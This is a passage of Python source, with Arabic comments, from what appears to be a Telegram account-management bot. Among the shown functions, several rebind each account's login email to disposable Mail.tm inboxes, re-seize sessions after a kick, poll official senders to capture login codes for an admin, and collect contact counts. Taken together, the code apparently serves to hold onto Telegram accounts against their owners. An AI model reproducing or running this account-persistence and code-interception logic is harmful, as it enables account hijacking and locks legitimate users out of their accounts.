                    attempt=attempt + 1,
                    error=res.get("error", ""),
                )
                await asyncio.sleep(60 * (attempt + 1))
            await _notify_admin(phone, "email_retry_fail", error="استنفدت المحاولات")
        except Exception as e:
            logger.error("email bind retry %s: %s", phone, e)
            await _notify_admin(phone, "email_retry_fail", error=str(e))
        finally:
            _email_bind_retry_tasks.pop(phone, None)

    _email_bind_retry_tasks[phone] = asyncio.create_task(_worker())


def schedule_standard_recovery(phone: str, on_done=None):
    """إنعاش تلقائي: انتظار SESSION_RECOVERY_DELAY ثم كود من Mail.tm."""
    from config import SESSION_RECOVERY_DELAY

    schedule_session_recovery(
        phone, SESSION_RECOVERY_DELAY, on_done=on_done or _recovery_on_done
    )


async def _post_kick_session_watch(phone: str):
    """بعد الطرد: إن ماتت الجلسة — انتظار 5 دقائق ثم إنعاش عبر البريد."""
    await asyncio.sleep(60)
    if await check_session_alive(phone):
        return
    row = await database.get_session_by_phone(phone)
    if not row or not database.row_login_email(row) or not row["email_password"]:
        return
    if phone in _recovery_scheduled:
        return
    logger.info("session dead after kick, scheduling standard recovery %s", phone)
    schedule_standard_recovery(phone)


async def _schedule_recovery_if_needed(
    phone: str, on_done=None, delay: int | None = None
) -> bool:
    if phone in _recovery_scheduled:
        return False
    if delay is None:
        from config import SESSION_RECOVERY_DELAY

        delay = SESSION_RECOVERY_DELAY
    schedule_session_recovery(phone, delay, on_done=on_done)
    return True


async def startup_recover_dead_sessions(on_done=None) -> dict:
    """
    عند التشغيل: جلسات ميتة + غير صالحة (لها بريد) → إنعاش.
    """
    sessions = await database.get_all_sessions()
    invalid_rows = await database.get_invalid_sessions_with_login_email()
    scheduled = revived_in_db = dead = invalid_queued = 0
    seen_phones: set[str] = set()

    for s in sessions:
        phone = s["phone"]
        if not database.row_login_email(s) or not s["email_password"]:
            continue
        seen_phones.add(phone)
        alive = await check_session_alive(phone)
        if alive:
            if not s["valid"]:
                await database.mark_session_valid(phone)
                revived_in_db += 1
                _recovery_fail_count.pop(phone, None)
            continue
        dead += 1
        if await _schedule_recovery_if_needed(phone, on_done=on_done):
            scheduled += 1
        await asyncio.sleep(0.3)

    for s in invalid_rows:
        phone = s["phone"]
        if phone in seen_phones:
            continue
        if await check_session_alive(phone):
            await database.mark_session_valid(phone)
            revived_in_db += 1
            _recovery_fail_count.pop(phone, None)
            continue
        invalid_queued += 1
        if await _schedule_recovery_if_needed(phone, on_done=on_done, delay=0):
            scheduled += 1
        await asyncio.sleep(0.3)

    logger.info(
        "startup recovery: dead=%s invalid_queued=%s scheduled=%s revived=%s",
        dead,
        invalid_queued,
        scheduled,
        revived_in_db,
    )
    return {
        "dead": dead,
        "invalid_queued": invalid_queued,
        "scheduled": scheduled,
        "revived_in_db": revived_in_db,
    }


async def rescan_invalid_sessions_with_email(on_done=None) -> dict:
    """إعادة إنعاش الجلسات غير الصالحة التي ما زال لها بريد Login."""
    rows = await database.get_invalid_sessions_with_login_email()
    scheduled = revived = 0
    for s in rows:
        phone = s["phone"]
        if await check_session_alive(phone):
            await database.mark_session_valid(phone)
            _recovery_fail_count.pop(phone, None)
            revived += 1
            continue
        if await _schedule_recovery_if_needed(
            phone, on_done=on_done, delay=SESSION_RECOVERY_RETRY_DELAY
        ):
            scheduled += 1
        await asyncio.sleep(0.3)
    return {"checked": len(rows), "scheduled": scheduled, "revived": revived}


async def invalid_sessions_recovery_loop(on_done=None):
    """دورة دورية: إعادة محاولة الجلسات غير الصالحة ذات البريد."""
    while True:
        await asyncio.sleep(INVALID_SESSION_RESCAN_INTERVAL)
        try:
            stats = await rescan_invalid_sessions_with_email(on_done=on_done)
            if stats["scheduled"] or stats["revived"]:
                logger.info("invalid session rescan: %s", stats)
        except Exception as e:
            logger.error("invalid session rescan: %s", e)


def schedule_session_recovery(phone: str, delay: int, on_done=None):
    on_done = on_done or _recovery_on_done
    if phone in _recovery_tasks and not _recovery_tasks[phone].done():
        return
    if phone in _recovery_scheduled:
        return
    _recovery_scheduled.add(phone)

    async def _run():
        from config import SESSION_RECOVERY_DELAY
        wait = delay if delay >= 0 else SESSION_RECOVERY_DELAY
        try:
            await asyncio.sleep(wait)
            if await check_session_alive(phone):
                cancel_scheduled_recovery(phone)
                await _notify_admin(phone, "recovery_skipped_alive")
                return
            await _notify_admin(phone, "recovery_running")
            result = await recover_session(phone)
            if on_done:
                await on_done(phone, result)
        except asyncio.CancelledError:
            logger.info("recovery cancelled %s (session alive)", phone)
        except Exception as e:
            logger.error("recovery %s: %s", phone, e)
            if on_done:
                await on_done(phone, {"success": False, "error": str(e)})
        finally:
            _recovery_tasks.pop(phone, None)
            _recovery_scheduled.discard(phone)

    _recovery_tasks[phone] = asyncio.create_task(_run())


async def migrate_old_sessions_emails() -> dict:
    sessions = await database.get_sessions_needing_email_migration()
    migrated = failed = skipped = 0
    for s in sessions:
        phone = s["phone"]
        if await existing_login_email_ok(s):
            skipped += 1
            continue
        res = await change_login_email(phone)
        if res.get("skipped"):
            skipped += 1
        elif res.get("success"):
            migrated += 1
        else:
            failed += 1
        await asyncio.sleep(EMAIL_MIGRATION_DELAY)
    return {
        "migrated": migrated,
        "failed": failed,
        "skipped": skipped,
        "total": len(sessions),
    }


# ──────────────────────────────────────────
# مراقبة كود من رسائل تيليجرام (أدمن)
# ──────────────────────────────────────────
async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
    session = await database.get_session_by_phone(phone)
    if not session or not session["session_string"]:
        return None

    client = None
    try:
        client = make_telegram_client(session["session_string"])
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None

        snapshot = {}
        for sender_id in OFFICIAL_SENDERS:
            try:
                msgs = await client.get_messages(sender_id, limit=1)
                snapshot[sender_id] = msgs[0].id if msgs else 0
            except Exception:
                snapshot[sender_id] = 0

        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout

        while loop.time() < deadline:
            await asyncio.sleep(3)
            for sender_id, last_id in list(snapshot.items()):
                try:
                    new_msgs = await client.get_messages(sender_id, limit=5)
                    for msg in new_msgs:
                        if (
                            msg.id > last_id
                            and msg.text
                            and CODE_PATTERN.search(msg.text)
                        ):
                            await client.disconnect()
                            return msg.text
                    if new_msgs:
                        snapshot[sender_id] = max(last_id, new_msgs[0].id)
                except Exception:
                    pass

        await client.disconnect()
        return None
    except Exception:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None


# توافق مع الاستدعاءات القديمة
change_email_auto = change_login_email
full_clean_and_kick = admin_full_cleanup

# ─── shorthand ─────────────────────────────
async def verify_two_fa(phone: str, password: str) -> dict:
    """
    واجهة مبسطة لفحص التحقق بخطوتين من security_monitor.
    تُعيد {'valid': True/False, 'skip': True إذا الجلسة غير متصلة}
    """
    return await verify_two_fa_for_session(phone)


async def get_mutual_contacts(phone: str) -> dict:
    """
    يجلب عدد جهات الاتصال المشتركة وإجمالي جهات الاتصال للحساب.
    يُعيد {'total': N, 'mutual': M} أو None عند الفشل.
    """
    client = None
    try:
        row = await database.get_session_by_phone(phone)
        if not row:
            return None
        client = await get_active_client(phone)
        if not client:
            return None

        from telethon.tl.functions.contacts import GetContactsRequest
        result = await client(GetContactsRequest(hash=0))
        contacts = result.contacts if hasattr(result, "contacts") else []
        mutual = sum(1 for c in contacts if getattr(c, "mutual", False))
        total = len(contacts)

        await database.update_contacts_count(phone, total, mutual)
        return {"total": total, "mutual": mutual}
    except Exception as e:
        logger.debug("get_mutual_contacts %s: %s", phone, e)
        return None
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
